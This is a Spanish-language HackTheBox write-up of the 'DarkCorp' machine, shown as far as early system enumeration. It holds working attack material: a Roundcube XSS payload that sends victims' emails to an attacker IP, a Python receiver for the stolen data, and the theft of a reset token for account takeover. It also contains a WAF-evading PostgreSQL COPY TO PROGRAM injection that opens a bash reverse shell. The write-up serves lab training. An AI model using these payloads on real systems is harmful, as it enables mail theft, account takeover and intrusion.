---
title: DarkCorp - Insane (HTB)
permalink: /DarkCorp-HTB-Writeup/
tags:
  - Windows
  - Insane
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: DarkCorp - Insane (HTB)
seo_description: Desde un XSS en Roundcube, Explotación de ESC8 + Kerberos Relay, hasta el abuso de diseño de userPrincipalName en entornos mixtos Kerberos.
excerpt: Desde un XSS en Roundcube, Explotación de ESC8 + Kerberos Relay, hasta el abuso de diseño de userPrincipalName en entornos mixtos Kerberos.
header:
  overlay_image: /assets/images/headers/darkcorp-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/darkcorp-hackthebox.jpg
---
![image-center](/assets/images/posts/darkcorp-hackthebox.png)
{: .align-center}

**Habilidades:** `Roundcube` 1.6.7 Cross-Site Scripting (CVE-2024-42009), SQL Injection + RCE (`PostgreSQL`) via `COPY` - WAF Bypass, Linux System Enumeration, GPG File Decrypt, Credentials Leakage, Hash Cracking, Pivoting with `ligolo-ng`, AD Domain Enumeration, Abusing AD CS - `ESC8` Technique (Abusing Marshal DNS + Kerberos Relay), Abusing DPAPI Secrets + Powershell `CredentialManager` Module, Abusing AD ACL - `GenericWrite` Rights, Shadow Credentials, Abusing Mixed Vendors Kerberos Stacks - UPN Spoofing, Abusing `SSSD` - Cached Credentials, Abusing Group Policy Objects, (Bonus) DCSync
{: .notice--primary}

# Introducción

DarkCorp es una máquina Windows de dificultad `Insane` en HackTheBox donde debemos comprometer un entorno híbrido de Active Directory.

Inicialmente, debemos comprometer un sitio web basado en `Roundcube` explotando CVE-2024-42009, y luego de explotar una inyección SQL en Postgres ingresaremos a la primera máquina Linux (`drip`) unida al dominio de Active Directory. Conseguiremos credenciales descifrando un archivo de backup de una base de datos usando `GPG`, para posteriormente enumerar la red interna y explotar la técnica `ESC8` usando `Kerberos Relay` y abusando del procesamiento de SPNs en Windows, consiguiendo acceso al host `WEB-01` y obteniendo la flag de `user`.

La escalada de privilegios la conseguiremos a través de la explotación del diseño de `userPrincipalName` en entornos Kerberos mixtos (Windows/Unix), técnica la cual nos permitirá descifrar credenciales cacheadas por `sssd`. Luego de conseguir acceso al host `DC-01`, podremos abusar de una GPO para comprometer el dominio y completar `DarkCorp`.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
export TARGET_IP=10.129.232.7
ping -c1 $TARGET_IP
PING 10.129.232.7 (10.129.232.7): 56 data bytes
64 bytes from 10.129.232.7: icmp_seq=0 ttl=127 time=139.679 ms

--- 10.129.232.7 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 139.679/139.679/139.679/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos realizando un escaneo de puertos para identificar servicios expuestos en la máquina víctima. Primeramente utilizaremos el protocolo TCP

~~~ bash
rustscan -a $TARGET_IP --ulimit 5000 -- -sC -sV -Pn -n -oN services

Nmap scan report for 10.129.232.7
Host is up, received user-set (0.20s latency).
Scanned at 2026-05-28 22:12:37 -04 for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPM91a70VJCxg10WFerhkQv207077raOCX9rTMPBeEbHqGHO954XaFtpqjoofHOQWi2syh7IoOV5+APBOoJ60k0=
|   256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHquJFnMIhX9y8Ea87tDtRWPtxThlpE2Y1WxGzsyvQQM
80/tcp open  http    syn-ack nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.59 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Identificamos solamente dos servicios, `ssh` y `http`, lo cual no es tan habitual frente a un entorno Windows. Es probable que el entorno objetivo se encuentre detrás de estos servicios en una red interna.


## Web Enumeration

En cuanto a las tecnologías web, sabremos por la captura que nos enfrentamos ante `nginx 1.22.1`, podemos escanear más a fondo con herramientas como `whatweb`

~~~ bash
whatweb http://"$TARGET_IP" 
http://10.129.232.7 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.22.1], IP[10.129.232.7], Meta-Refresh-Redirect[http://drip.htb/], nginx[1.22.1]
http://drip.htb/ [302 Found] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], IP[10.129.232.7], RedirectLocation[index], Title[Redirecting...], nginx[1.22.1]
http://drip.htb/index [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@company.com,support@drip.htb], HTML5, HTTPServer[nginx/1.22.1], IP[10.129.232.7], PoweredBy[Roundcube], Script, Title[DripMail], nginx[1.22.1]
~~~

> Al intentar navegar hasta `http://10.129.232.7`, veremos que el servidor nos intenta redirigir al dominio `drip.htb`, lo cual no vimos desde la captura de `nmap`.
{: .notice--primary}

Agregaremos este nombre de dominio a nuestro archivo `/etc/hosts` para aplicar correctamente las resoluciones DNS.

~~~ bash
export DOMAIN=drip.htb

echo "$TARGET_IP $DOMAIN" | sudo tee -a /etc/hosts
10.129.232.7 drip.htb
~~~

Volveremos a lanzar la herramienta `whatweb` para analizar las tecnologías web que el servidor está empleando

``` bash
whatweb http://"$DOMAIN" 
http://drip.htb [302 Found] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], IP[10.129.232.7], RedirectLocation[index], Title[Redirecting...], nginx[1.22.1]
http://drip.htb/index [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@company.com,support@drip.htb], HTML5, HTTPServer[nginx/1.22.1], IP[10.129.232.7], PoweredBy[Roundcube], Script, Title[DripMail], nginx[1.22.1]
```

Ahora si navegamos hasta `drip.htb`, veremos la siguiente web. El sitio web tiene como nombre `DripMail` y parece ser un servicio de correo electrónico.

![image-center](/assets/images/posts/darkcorp-1-hackthebox.png)
{: .align-center}

### Roundcube

Por si no nos dimos cuenta de que el servidor emplea `Roundcube` al ver las imágenes, veremos el siguiente mensaje en la web que lo confirma

![image-center](/assets/images/posts/darkcorp-2-hackthebox.png)
{: .align-center}

Al hacer `Hovering` sobre el botón `Sign in`, se muestra un enlace al subdominio `mail.drip.htb`

![image-center](/assets/images/posts/darkcorp-3-hackthebox.png)
{: .align-center}

Añadiremos este subdominio a nuestro archivo `/etc/hosts` con el fin de aplicar correctamente resolución DNS y poder acceder a él

``` bash
sudo sed -i "s/$DOMAIN/& mail.&/" /etc/hosts
```

### Registration

En la página inicial, veremos un enlace que nos permite registrarnos bajo la ruta `/register`

![image-center](/assets/images/posts/darkcorp-4-hackthebox.png)
{: .align-center}

Aprovecharemos esta funcionalidad para registrar una cuenta e iniciar sesión en la plataforma

![image-center](/assets/images/posts/darkcorp-5-hackthebox.png)
{: .align-center}

Al registrarnos, podremos iniciar sesión en la plataforma `Roundcube` bajo el subdominio `mail.drip.htb`

![image-center](/assets/images/posts/darkcorp-6-hackthebox.png)
{: .align-center}

Al ingresar a la plataforma, nos cargará nuestra bandeja de entrada.

> El servidor nos ha asignado el dominio `@drip.htb` al usuario que hemos creado.
{: .notice--info}

![image-center](/assets/images/posts/darkcorp-7-hackthebox.png)
{: .align-center}

Al ver el correo electrónico de bienvenida, veremos un usuario `support@drip.htb`

![image-center](/assets/images/posts/darkcorp-8-hackthebox.png)
{: .align-center}

Al presionar la pestaña `About` de la barra lateral izquierda, se desplegará la siguiente tarjeta que contiene información sobre la versión de `Roundcube`, la cual es la `1.6.7`

![image-center](/assets/images/posts/darkcorp-9-hackthebox.png)
{: .align-center}

Esta versión de `Roundcube` parece ser vulnerable a `Cross-Site Scripting`, concretamente a [CVE-2024-42009](https://www.cve.org/CVERecord?id=CVE-2024-42009) y [CVE-2024-42008](https://www.cve.org/CVERecord?id=CVE-2024-42008). Por ahora exploraremos más las funcionalidades de la plataforma antes de intentar explotar estos CVE

![image-center](/assets/images/posts/darkcorp-10-hackthebox.png)
{: .align-center}

### Contact

En la web de inicio podemos ver un formulario de contacto. A modo de prueba, podemos enviar un mensaje a través de él para ver cómo se comporta la web

![image-center](/assets/images/posts/darkcorp-11-hackthebox.png)
{: .align-center}

Si interceptamos la solicitud con un proxy HTTP (como `Burpsuite`), veremos la solicitud que estamos enviando.

> En este caso la cuenta encargada de recibir nuestro correo es `support@drip.htb`.
{: .notice--danger}

![image-center](/assets/images/posts/darkcorp-12-hackthebox.png)
{: .align-center}

Podemos probar cambiando el nombre del parámetro `recipient` para enviar el correo hacia nosotros (en mi caso, lo enviaría a `incommatose@drip.htb`)

![image-center](/assets/images/posts/darkcorp-13-hackthebox.png)
{: .align-center}

Veremos el correo electrónico en nuestra bandeja de entrada, donde el `footer` menciona que **si sospechamos de un correo malicioso, que contactemos con `bcase@drip.htb`**

![image-center](/assets/images/posts/darkcorp-14-hackthebox.png)
{: .align-center}

``` text
If you suspect that you've received a "phishing" e-mail, please forward the entire email to our security engineer at bcase@drip.htb
```
<br>


# Intrusión / Explotación
---
## CVE-2024-42009 - Roundcube 1.6.7 Cross-Site Scripting

[CVE-2024-42009]() es una vulnerabilidad entre las versiones `1.5.7` y `1.6.7` del software `Roundcube`. Permite que un atacante no autenticado consiga robar correos electrónicos, contactos, o incluso enviar correos en el nombre de la víctima. 

Para su explotación solamente basta con que el usuario víctima abra un correo malicioso entrante

### Understanding Vulnerability

El fallo se produce cuando la herramienta [`WasHTML`](https://hakre.wordpress.com/2010/09/29/washtml-php-library/) (que utiliza `Roundcube` para sanitizar contenido HTML) sanitiza los correos electrónicos para luego ser procesados en la función [`message_body()`](https://github.com/roundcube/roundcubemail/blob/1.6.7/program/actions/mail/show.php#L646).

Esto puede aprovecharse para inyectar código `javascript` en un correo electrónico, a continuación se muestra un fragmento del código fuente vulnerable correspondiente a la versión `1.6.7`. 

~~~ php
public static function message_body($attrib)
{
  // ...
  // Parse the part content for display
  // [1] sanitize
  $body = self::print_body($body, $part, $body_args);
  // ...
  if ($part->ctype_secondary == 'html') {
     // [2] modify -> desanitization
     $body = self::html4inline($body, $body_args); 
  }
  // [3] desanitized html is displayed
  $out .= html::div($body_args['container_attrib'], $plugin['prefix'] . $body);
  // ...
}
~~~

El contenido HTML del correo se sanitiza dentro de la función [`print_body()`](https://github.com/roundcube/roundcubemail/blob/1.6.7/program/actions/mail/index.php#L1001), sin embargo lo que retorna es un documento HTML completo. Este contenido se transforma desde la función [`html4inline()`](https://github.com/roundcube/roundcubemail/blob/1.6.7/program/actions/mail/index.php#L1185).

Esta función transforma un documento HTML en un fragmento  eliminando `<!DOCTYPE>`, `<head>` y otros elementos. Reemplazando la etiqueta `<body>` por un `<div>`, ya que la página principal ya tiene una etiqueta `<body>`. 

~~~ php
public static function html4inline($body, &$args)
{
  //...
  $regexp = '/<body([^>]*)/';

  // Handle body attributes that doesn't play nicely with div elements
  if (preg_match($regexp, $body, $m)) {
    $style = [];
    $attrs = $m[0];
    // ...
  }
}
~~~

También hay cierta lógica para eliminar los atributos heredados `bgcolor`, `text` y `background` del elemento `<body>`, aplicando una serie de expresiones regulares.

El problema viene cuando las expresiones regulares que se aplican en esta última función "rompen" el HTML, que ya venía seguro desde `print_body()`, logrando un efecto inverso. 

La siguiente etiqueta `<body>` forma parte de la prueba de concepto compartida desde el [siguiente post](https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/#desanitization-in-inline-email-rendering-cve202442009). Dado que `html4inline()` se utiliza después de la sanitización, los atributos maliciosos que se introducen de la siguiente manera no se eliminan.

~~~ bash
<body title="bgcolor=foo" name="bar onload=alert(origin)">

preg_replace() -> <body title=" name="bar onload=alert(origin)">
~~~

### Proof of Concept

Como el `body` se transforma en un `div`, un atributo que funciona para inyectar código `javascript` sería `onanimationstart`

~~~ html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar">Foo</body>
~~~

> Opcionalmente, podemos ejecutar pruebas antes de explotar este CVE, como probar enviar un correo malicioso a nosotros mismos y ver su comportamiento.
{: .notice--warning}

Comenzaremos enviando la siguiente solicitud, la cual envía el payload en el parámetro `message`, debería aparecer el nuevo correo en nuestra bandeja.

> Nota cómo cambiamos el parámetro `content` para que su valor sea `html`
{: .notice--danger}

![image-center](/assets/images/posts/darkcorp-15-hackthebox.png)
{: .align-center}

Al abrir el correo que nos acabamos de enviar, deberíamos ver un cuadro de diálogo. 

![image-center](/assets/images/posts/darkcorp-16-hackthebox.png)
{: .align-center}

> Esto indica que estamos inyectando correctamente código `javascript` dentro del atributo `onanimationstart` de la etiqueta `body`
{: .notice--success}

La siguiente [prueba de concepto](https://github.com/Bhanunamikaze/CVE-2024-42009) se encarga de enviar correos maliciosos, además de iniciar un servidor HTTP para recibirlos, aunque podemos alternativamente construir el nuestro

Para construir nuestro payload, necesitaremos conocer un poco la lógica de los correos electrónicos. 

Podemos notar que al hacer `hovering` al título de un correo, veremos la URL que hace referencia a su visualización

~~~
http://mail.drip.htb/?_task=mail&_mbox=INBOX&_uid=3&_action=show
~~~

![image-center](/assets/images/posts/darkcorp-17-hackthebox.png)
{: .align-center}

> Debemos considerar que:
>
> - El parámetro `_uid` identifica a cada correo electrónico en nuestra bandeja de entrada.
> - Para visualizar un correo se utiliza el parámetro `action` con el valor `show`.
{: .notice--info}

El siguiente código `javascript` será lo que el usuario procese una vez abra nuestro correo malicioso 

``` javascript
fetch('/?_task=mail&_action=show&_uid=1&_mbox=INBOX&_extwin=1')
.then(response=>response.text())
.then(data=>fetch(`http://10.10.15.30/?data=btoa(${data}))
```

De forma que el payload final que enviaremos sería más o menos lo siguiente

``` html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('/?_task=mail&_mbox=INBOX&_uid=1&_action=show').then(response=>response.text()).then(data=>fetch(`http://10.10.15.30/?data=${btoa(data)}`)) foo=bar'">Foo</body>
```

El siguiente código en `python3` basado en la prueba de concepto que encontramos se encargará de recibir los correos electrónicos y decodificarlos para ver su contenido

``` python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import base64
from bs4 import BeautifulSoup
import html

class MyGetHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return # Supress logging
 
    def do_GET(self):
        query_params = parse_qs(urlparse(self.path).query)
        b64_string = query_params['data'][0].replace(' ', '+')
        
        if 'data' in query_params:
            try:
                content = base64.b64decode(b64_string)
            except Exception:
                content = b64_string.encode('utf-8', errors='ignore')
                
            soup = BeautifulSoup(content, 'html.parser')
            email_body = soup.find('div', id='messagebody')   
            text_value = email_body.get_text(separator="\n", strip=True)
            text_value = html.unescape(text_value)
            print(f'Captured email: \n{text_value}\n')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

if __name__ == '__main__':
    print('Starting HTTP Server on 0.0.0.0:80...')
    HTTPServer(('0.0.0.0', 80), MyGetHandler).serve_forever()
```

> Recordemos el mensaje que vimos anteriormente, mencionando que podemos reportar emails sospechosos de Phishing.
> 
> Nuestro usuario objetivo será el ingeniero encargado de verificar estos correos sospechosos (`bcase@drip.htb`).
{: .notice--warning}

Intentemos enviar un correo con el payload a esta cuenta, de forma que enumeremos el contenido de cada correo electrónico de su bandeja de entrada

![image-center](/assets/images/posts/darkcorp-18-hackthebox.png)
{: .align-center}

Al cabo de unos segundos, recibiremos una solicitud HTTP en nuestro servidor

``` bash
uv venv
source .venv/bin/activate
uv pip install beautifulsoup4 requests

uv run server.py
Starting HTTP Server on 0.0.0.0:80...
Email recieved from victim: 
Hi bcase,
Welcome to DripMail! We're excited to provide you with convenient email solutions! If you need help, please reach out to us at
support@drip.htb
.

```

### Exploiting

Ahora que tenemos la capacidad para exfiltrar correos electrónicos, podemos comenzar a iterar la bandeja de entrada de la víctima usando el parámetro `_uid`.

> En este caso decidí usar `curl` para iterar por los `5` primeros correos usando un bucle `for` en `bash`.
{: .notice--primary}

``` bash
for uid in $(seq 1 5); do echo "Sending payload with uid: $uid"; curl -sX POST "http://$DOMAIN/contact" -d "name=Foo&email=incommatose%40drip.htb&message=<body+title%3d\"bgcolor%3dfoo\"+name%3d\"bar+style%3danimation-name%3aprogress-bar-stripes+onanimationstart%3dfetch('/%3f_task%3dmail%26_mbox%3dINBOX%26_uid%3d$uid%26_action%3dshow').then(response%3d>response.text()).then(data%3d>fetch(\`http%3a//10.10.15.30/%3fdata%3d\${btoa(data)}\`))+foo%3dbar'\">Foo</body>&content=html&recipient=bcase%40drip.htb" &>/dev/null ; done
Sending payload with uid: 1
Sending payload with uid: 2
Sending payload with uid: 3
Sending payload with uid: 4
Sending payload with uid: 5

```

Ejecutaremos el exploit de la siguiente manera, veremos uno a uno los correos electrónicos correspondientes al usuario víctima

``` bash
Captured email: 
Hi bcase,
Welcome to DripMail! We're excited to provide you with convenient email solutions! If you need help, please reach out to us at
support@drip.htb
.

Captured email: 
Hey Bryce,
The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.
You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.
If you encounter any issues or have feedback, let me know so I can address them promptly.
Thanks

Captured email: 
Foo
Confidentiality Notice: This electronic communication may contain confidential or privileged information. Any unauthorized review, use, disclosure, copying, distribution, or taking of any part of this email is strictly prohibited.
If you suspect that you've received a "phishing" e-mail, please forward the entire email to our security engineer at bcase@drip.htb

Captured email: 
Foo
Confidentiality Notice: This electronic communication may contain confidential or privileged information. Any unauthorized review, use, disclosure, copying, distribution, or taking of any part of this email is strictly prohibited.
If you suspect that you've received a "phishing" e-mail, please forward the entire email to our security engineer at bcase@drip.htb

Captured email: 
Foo
Confidentiality Notice: This electronic communication may contain confidential or privileged information. Any unauthorized review, use, disclosure, copying, distribution, or taking of any part of this email is strictly prohibited.
If you suspect that you've received a "phishing" e-mail, please forward the entire email to our security engineer at bcase@drip.htb

```

Aparte del mensaje de bienvenida, lograremos ver un correo que menciona una plataforma en desarrollo bajo el subdominio `dev-a3f1-01.drip.htb`. 

Agregaremos este subdominio a nuestro archivo `/etc/hosts` rápidamente usando el siguiente comando

``` bash
sudo sed -i "s/$DOMAIN\$/& dev-a3f1-01.$DOMAIN/" /etc/hosts
```

El mensaje anterior menciona que debemos cambiar la contraseña antes de ingresar a la plataforma.


## Web Access as `bcase` - `drip`

Al navegar hasta el nuevo subdominio, veremos una web con el mensaje `Access denied`, debajo de este se encuentra un botón que nos redirige a `/login`

![image-center](/assets/images/posts/darkcorp-19-hackthebox.png)
{: .align-center}

Dentro de la web de `login`, encontraremos un enlace que nos redirige a `/forgot`

![image-center](/assets/images/posts/darkcorp-20-hackthebox.png)
{: .align-center}

Aquí podemos probar indicando nuestra dirección de correo, aunque obtendremos un error.

### Account Takeover

Como podemos acceder a los correos de la cuenta `bcase@drip.htb`, haremos que el enlace realmente llegue a su bandeja de entrada. Posteriormente volveremos a exfiltrar sus correos para obtener el enlace

> En este punto recomiendo reiniciar la máquina para no tener que enviar `800` mil correos (producto de las pruebas que hicimos anteriormente, las cuales en mi caso perdí la cuenta, pero fueron bastantes).
{: .notice--danger}

![image-center](/assets/images/posts/darkcorp-21-hackthebox.png)
{: .align-center}

Volveremos a realizar el ataque, esta vez deberíamos intentar ver un nuevo correo con el enlace de recuperación

``` bash
uv run server.py
Starting HTTP Server on 0.0.0.0:80...
```

Lanzaremos un rango mayor de `_uid`, con el fin de capturar más correos entrantes de la bandeja de entrada

``` bash
for uid in $(seq 1 10); do echo "Sending email with uid: $uid"; curl -sX POST "http://$DOMAIN/contact" -d "name=Foo&email=incommatose%40drip.htb&message=<body+title%3d\"bgcolor%3dfoo\"+name%3d\"bar+style%3danimation-name%3aprogress-bar-stripes+onanimationstart%3dfetch('/%3f_task%3dmail%26_mbox%3dINBOX%26_uid%3d$uid%26_action%3dshow').then(response%3d>response.text()).then(data%3d>fetch(\`http%3a//10.10.15.30/%3fdata%3d\${btoa(data)}\`))+foo%3dbar'\">Foo</body>&content=html&recipient=bcase%40drip.htb" &>/dev/null ; done 
Sending email with uid: 1
Sending email with uid: 2
Sending email with uid: 3
Sending email with uid: 4
Sending email with uid: 5
Sending email with uid: 6
Sending email with uid: 7
Sending email with uid: 8
Sending email with uid: 9
Sending email with uid: 10
```

En nuestro servidor HTTP comenzamos a ver el contenido de cada correo hasta que vemos el sigiuente

``` bash
<SNIP>

Captured email: 
Your reset token has generated. ĀPlease reset your password within the next 5 minutes.
You may reset your password here:
http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.ahnFuQ.ObOCjrFgySg08EXnRSDV-04ixmE
```

### Web Access

Accederemos a este enlace que exfiltramos para restablecer la contraseña del usuario `bcase`

![image-center](/assets/images/posts/darkcorp-22-hackthebox.png)
{: .align-center}

Una vez cambiemos la contraseña del usuario `bcase`, accederemos a la plataforma 

![image-center](/assets/images/posts/darkcorp-23-hackthebox.png)
{: .align-center}

Al iniciar sesión en la plataforma como el usuario `bcase`, veremos la siguiente página web

![image-center](/assets/images/posts/darkcorp-24-hackthebox.png)
{: .align-center}

### Analytics

Tendremos una funcionalidad de búsqueda desde la sección `Analytics`

![image-center](/assets/images/posts/darkcorp-25-hackthebox.png)
{: .align-center}

Al posiblemente tratarse de una plataforma personalizada, haremos pruebas habituales de vulnerabilidades frente a la funcionalidad de búsqueda. 


## SQL Injection

Al ingresar un dato cualquiera a modo de prueba, veremos cómo se acontece un error SQL en la web

![image-center](/assets/images/posts/darkcorp-26-hackthebox.png)
{: .align-center}

Al parecer, lo que ingresamos en el buscador forma parte de la query para buscar una columna de la tabla `Users`.

Además, este error proviene de la libería `psycopg2`, a través de una búsqueda rápida, notaremos que se trata de una libería en Python para `PostgreSQL`.

> `Psycopg2` es la biblioteca (o adaptador) más popular del lenguaje Python para conectarse y trabajar con bases de datos `PostgreSQL`.
{: .notice--info}

### Testing

Luego de algunas pruebas, descubriremos que ingresar dos comillas simples (`'`) cierra correctamente la query y no genera errores

``` sql
''
```

![image-center](/assets/images/posts/darkcorp-27-hackthebox.png)
{: .align-center}

Podemos ingresar un caracter de `;` para enviar una query en una nueva línea

``` sql
''; SELECT 1
```

![image-center](/assets/images/posts/darkcorp-28-hackthebox.png)
{: .align-center}

### Local File Inclusion

Si intentamos enviar una query que cargue archivos de la máquina usando la función `pg_file_read()`, tendremos capacidad de lectura

``` sql
'';SELECT pg_read_file('/etc/passwd');
```

> La salida de este comando nos confirma que el host que ejecuta este servicio posee el sistema operativo `Linux`.
{: .notice--success}

![image-center](/assets/images/posts/darkcorp-29-hackthebox.png)
{: .align-center}

Al consultar el archivo `/etc/hosts` veremos que tenemos entradas de host en una red interna

![image-center](/assets/images/posts/darkcorp-30-hackthebox.png)
{: .align-center}

También podemos listar directorios usando la función `pg_ls_dir()`

``` sql
'';SELECT pg_ls_dir('/etc');
```

![image-center](/assets/images/posts/darkcorp-31-hackthebox.png)
{: .align-center}

### RCE via `COPY` - WAF Bypass

Cuando intentamos una query que ejecute un comando con la sentencia `COPY (SELECT '') TO PROGRAM`, el servidor arrojará un error

``` sql
''; COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';
```

![image-center](/assets/images/posts/darkcorp-32-hackthebox.png)
{: .align-center}

Sin embargo, puede que exista algún filtro que podría valer la pena eludir con técnicas como se especifica en [`PayloadAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-waf-bypass) y en [`Hacktricks`](https://hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html#bypass-keyword-filterswaf-to-reach-copy-program).

> En contextos de consultas `SQL` en `Postgres`, un `WAF` o ciertos sistemas de monitoreo eliminan palabras como `COPY ... TO PROGRAM` para bloquear consultas maliciosas.
{: .notice--info}

La siguiente query intenta eludir este tipo de protecciones superficiales usando una técnica que fragmenta la consulta original para pasar el filtro.

> En este caso reemplaza la letra `C` por su código en `ASCII` con la función `CHR()`, y el resto de la consulta pasaría desapercibida y no sería bloqueada por un `WAF`. 
{: .notice--primary}

Posteriormente, `EXECUTE` le infica a `PostgreSQL` que ejecute el texto que acaba de construir con la variable `cmd`

``` sql
''DO $$
DECLARE cmd text;
BEGIN
  cmd := CHR(67) || 'COPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.15.30/443 0>&1"''';
  EXECUTE cmd;
END $$;
```

Al enviar la query anterior posterior a nuestro payload inicial (`'';`), la web se quedará cargando

![image-center](/assets/images/posts/darkcorp-33-hackthebox.png)
{: .align-center}


## Shell as `postgres` - `drip`

Desde nuestro listener, habremos recibido una consola como el usuario `postgres`

``` bash
Connection from 10.129.5.241:49938
bash: cannot set terminal process group (2909): Inappropriate ioctl for device
bash: no job control in this shell
postgres@drip:/var/lib/postgresql/15/main$ id 
id
uid=102(postgres) gid=110(postgres) groups=110(postgres),109(ssl-cert)
```

### TTY Treatment

Haremos un tratamiento de esta consola con el fin de conseguir una más interactiva, además de ajustar las proporciones de la terminal con el comando `stty`

``` bash
ostgres@drip:/var/lib/postgresql/15/main$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
postgres@drip:/var/lib/postgresql/15/main$ ^Z
[1]  + 8440 suspended  nc -lvnp 443

╭─ incommatose@HackBookPro ~/.exegol/workspaces/hackthebox/labs/machines/darkcorp/exploits
╰─ $ stty raw -echo;fg  
[1]  + 8440 continued  nc -lvnp 443
                                   reset xterm 
postgres@drip:/var/lib/postgresql/15/main$ export TERM=xterm
postgres@drip:/var/lib/postgresql/15/main$ stty rows 48 columns 156
```

### System Enumeration

En este punto nos encontramos dentro de una máquina Linux, procederemos a enumerar el sistema en búsqueda de vías potenciales para movernos lateralmente por la red y escalar privilegios

``` bash
postgres@drip:/var/lib/postgresql/15/main$ cat /etc/os-release 
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

Recordemos que en el archivo `/etc/hosts` vimos entradas de `host` definidas para la red interna `172.16.20.X/X`.

Al listar todas las direcciones IP de las interfaces de red existentes con `hostname`, veremos que esta máquina tiene asignada la `.3` de esta red interna

``` bash
postgres@drip:/var/lib/postgresql/15/main$ hostname -I 
hostname -I
172.16.20.3 
```

### Users

Desde el archivo `/etc/passwd` podemos ver qué usuarios son válidos a nivel de sistema

``` bash
postgres@drip:/var/lib/postgresql/15/main$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
bcase:x:1000:1000:Bryce Case Jr.,,,:/home/bcase:/bin/bash
postgres:x:102:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ebelford:x:1002:1002:Eugene Belford:/home/ebelford:/bin/bash
```

### Open Ports

Podemos listar los puertos abiertos internamente en la máquina `drip` en búsqueda de servicios internos

``` bash
ebelford@drip:/tmp$ ss -tunl | grep LISTEN
tcp   LISTEN 0      100        127.0.0.1:993        0.0.0.0:*          
tcp   LISTEN 0      5          127.0.0.1:40435      0.0.0.0:*          
tcp   LISTEN 0      2048       127.0.0.1:8000       0.0.0.0:*          
tcp   LISTEN 0      2048       127.0.0.1:8001       0.0.0.0:*          
tcp   LISTEN 0      10         127.0.0.1:33059      0.0.0.0:*          
tcp   LISTEN 0      244        127.0.0.1:5432       0.0.0.0:*          
tcp   LISTEN 0      100        127.0.0.1:143        0.0.0.0:*          
tcp   LISTEN 0      100        127.0.0.1:587        0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      100        127.0.0.1:25         0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
tcp   LISTEN 0      128             [::]:22            [::]:*          
tcp   LISTEN 0      511             [::]:80            [::]:*
```

### Database Credentials

Enumerando los archivos del sitio web `dashboard`, veremos un archivo `.env`

``` bash
postgres@drip:/var/lib/postgresql/15/main$ ls -la /var/www/html/dashboard/
total 36
drwxr-xr-x 5 root root 4096 Jan 16  2025 .
drwxr-xr-x 4 root root 4096 Jan 13  2025 ..
drwxr-xr-x 7 root root 4096 Jan 10  2025 apps
lrwxrwxrwx 1 root root   18 Dec 19  2024 app_venv -> /var/www/app_venv/
-rw-r--r-- 1 root root  796 Jan 15  2025 .env
-rw-r--r-- 1 root root  198 Dec 17  2024 gunicorn-cfg.py
